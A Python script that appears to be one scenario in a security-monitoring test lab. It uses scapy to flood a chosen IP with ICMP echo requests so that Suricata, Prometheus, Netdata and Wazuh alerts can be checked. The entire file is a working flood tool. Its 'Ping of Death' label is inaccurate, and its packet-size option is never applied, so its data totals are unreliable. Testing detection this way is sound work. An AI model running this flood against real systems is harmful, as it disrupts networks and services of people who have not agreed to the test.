#!/usr/bin/env python3
"""
Scenario 4: ICMP Echo Flood (Ping of Death)
- Difficulty: Intermediate
- Detection: Suricata, Prometheus, Netdata
- Expected Alert: ICMP flood detection, packet rate spike
"""

import sys
import argparse
import logging
import time
from scapy.all import IP, ICMP, send, conf

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

conf.verbose = False

class ICMPFloodScenario:
    def __init__(self, target, duration=60, intensity=5, packet_size=56, verbose=False):
        self.target = target
        self.duration = duration
        self.intensity = intensity
        self.packet_size = packet_size
        self.verbose = verbose
        self.packet_count = 0
        self.start_time = None
        self.results = {
            'scenario': 'ICMP_FLOOD',
            'target': target,
            'duration': duration,
            'packets_sent': 0,
            'pps': 0,
            'status': 'pending'
        }

    def generate_icmp_flood(self):
        """Generate ICMP echo flood"""
        packets_per_second = 200 * self.intensity / 5  # 200 PPS at intensity 5

        logger.info(f"[*] Starting ICMP Flood against {self.target}")
        logger.info(f"[*] Duration: {self.duration}s | Intensity: {self.intensity}/10 ({packets_per_second:.0f} PPS)")
        logger.info(f"[*] Packet Size: {self.packet_size} bytes")

        self.start_time = time.time()
        elapsed = 0
        delay = 1.0 / packets_per_second if packets_per_second > 0 else 0

        try:
            while elapsed < self.duration:
                # Create ICMP echo request
                pkt = IP(dst=self.target) / ICMP(type=8, code=0)

                try:
                    send(pkt, verbose=0)
                    self.packet_count += 1

                    if self.verbose and self.packet_count % 100 == 0:
                        logger.info(f"[+] Sent {self.packet_count} ICMP packets...")

                    time.sleep(delay)
                except Exception as e:
                    if self.verbose:
                        logger.warning(f"[-] Error sending packet: {e}")

                elapsed = time.time() - self.start_time

        except KeyboardInterrupt:
            logger.info("\n[!] Attack interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        self.results['packets_sent'] = self.packet_count
        self.results['pps'] = self.packet_count / self.duration if self.duration > 0 else 0
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log scenario results"""
        logger.info("\n" + "="*60)
        logger.info("ICMP FLOOD RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}")
        logger.info(f"Duration: {self.duration} seconds")
        logger.info(f"Total ICMP Packets Sent: {self.packet_count}")
        logger.info(f"Packets Per Second (PPS): {self.results['pps']:.2f}")
        logger.info(f"Total Data Sent: {self.packet_count * self.packet_size / 1024:.2f} KB")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - Suricata: Look for ICMP flood alerts")
        logger.info("  - Prometheus: Monitor icmp_packets_per_second spike")
        logger.info("  - Netdata: Check ICMP rate and bandwidth")
        logger.info("  - Wazuh: Search for 'ICMP' anomaly")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='ICMP Echo Flood Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 04_icmp_flood.py --target 10.10.10.10 --duration 60
  python 04_icmp_flood.py --target 192.168.1.100 --intensity 8 --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--intensity', type=int, default=5, help='Attack intensity 1-10')
    parser.add_argument('--packet-size', type=int, default=56, help='ICMP packet payload size')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    if not 1 <= args.intensity <= 10:
        logger.error("[-] Intensity must be between 1-10")
        sys.exit(1)

    scenario = ICMPFloodScenario(
        target=args.target,
        duration=args.duration,
        intensity=args.intensity,
        packet_size=args.packet_size,
        verbose=args.verbose
    )

    scenario.generate_icmp_flood()

if __name__ == '__main__':
    main()
